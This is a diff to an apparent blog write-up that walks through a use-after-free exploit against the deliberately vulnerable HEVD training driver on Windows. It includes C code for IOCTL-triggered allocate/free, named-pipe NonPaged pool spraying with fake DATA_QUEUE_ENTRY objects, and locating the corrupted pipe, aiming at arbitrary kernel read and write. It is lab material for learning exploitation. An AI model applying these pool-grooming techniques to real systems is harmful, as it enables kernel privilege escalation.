@@ -134,35 +134,97 @@ void CreateHoles() {
    
 At this point, we have 0x60 size holes in the NonPaged pool memory. The goal now is to allocate the g_UseAfterFreeObjectNonPagedPoolNx (HEVD.sys) in one of this holes by calling the 0x222053 IOCTL and then free this object calling the IOCTL 0x22205B:
  
-    ```
- //allocate HEVD object
-	printf("[+] Allocate HEVD object\n");
-	DeviceIoControl(hevd, IOCTL_ALLOC_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
-	printf("[+] Free HEVD object\n");
-	//free  HEVD object
-	DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
+```
+printf("[+] Allocate HEVD object\n");
+DeviceIoControl(hevd, IOCTL_ALLOC_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
+printf("[+] Free HEVD object\n");
+//free  HEVD object
+DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
  ```
-
    
 The memory layout at this point is showed below:
    
-      ![Image](/images/HEVD.jpg)
+![Image](/images/HEVD.JPG)
       
       
       
 ####  3. Reclaim freed HEVD object
        
-    Right now we need to reclaim the freed HEVD object spraying again with NpFr (DATA_QUEUE_ENTRY) objects. The code is the that used previously in step 1.
+Right now we need to reclaim the freed HEVD object spraying again with NpFr (DATA_QUEUE_ENTRY) objects. The code is the that used previously in step 1.
     
-    It's important to use the same unique pipe name that was used in the first spray. The reason of this will be explained in the next section and it's related with the cleanup process. At this point the memory layout is showed below:
+It's important to use the same unique pipe name that was used in the first spray. The reason of this will be explained in the next section and it's related with the cleanup process. At this point the memory layout is showed below:
     
-      ![Image](/images/AllocNpFr.jpg)
+![Image](/images/AllocNpFr.jpg)
       
 In the image above we see in green that the previously allocated HEVD object has been filled by a DATA_QUEUE_ENTRY object (tagged with NpFr).
       
-   ####  4. Free DATA_QUEUE_ENTRY object
+####  4. Free DATA_QUEUE_ENTRY object
    
  Now we can trigger the free IOCTL 0x22205B  again to free this NpFr object obtaining the memory laylout below:
       
-      
+![Image](/images/freeNpFr.jpg)   
+
+####  5. Spray fake objects
+
+5. The next step is to perform a third spray in order to store a fake NpFr object in the previously freed NpFr hole using the IOCTL 0x222053. This is done with the code below:
    
+   ```
+  void SprayNonPagedPool(LPVOID fakeEntry)
+{
+	BOOL res = 0;
+	DWORD BytesReturned = 0;
+
+	printf("[+] Spraying fake objects\n");
+
+	for (int i = 0; i < 5000; i++)
+	{
+		res = DeviceIoControl(hevd, IOCTL_ALLOC_FAKE_OBJ_NX, fakeEntry, sizeof(fakeEntry), NULL, 0, &BytesReturned, NULL);
+
+		if (!res)
+		{
+			DWORD err = GetLastError();
+			printf("[+] DeviceIoControl, error: %p\n", err);
+		}
+	}
+}
+
+ ```
+ 
+Now the memory layout is:
+
+![Image](/images/fakeobject2.jpg)   
+
+Therefore we can place a fake DATA_QUEUE_ENTRY object in memory and we can interact from user-land with it using its related handler and Windows APIs. How we build this fake object is the key to achieve arbitrary red and write but we first need to locate the handler related with the fake object. This can be done writting specific bytes (magic bytes) in the last spray using the IOCTL 0x222053 and iterating through all the handlers until we get a match when reading the content of the entry using the API PeekNamedPipe():
+
+ ```
+PIPE_HANDLES DetectPipe()
+{
+	BOOL res = 0;
+	UCHAR payload[DATA_ENTRY]; //0x60 blocks
+	memset(payload, 0x44, sizeof(payload));
+	DWORD resultLength = 0;
+	DWORD magic = 0x45464748;
+	DWORD extract = 0x0;
+
+	for (int i = 0; i < 10000; i++) //iterate through all the
+	{
+
+		res = PeekNamedPipe(PipeArrayB_2[i].Read, payload, DATA_ENTRY, &resultLength, 0, 0);
+
+		extract = *(DWORD*)(payload);
+		if (extract == magic)
+		{
+			printf("[+] Corrupted DATA_QUEUE_ENTRY found!\n");
+			return PipeArrayB_2[i];
+		}
+
+		if (!res)
+		{
+			printf("[-] error reading in pipe\n");
+			return { 0 };
+		}
+	}
+	printf("[+] Find corrupted PIPE\n");
+}
+
+ ```
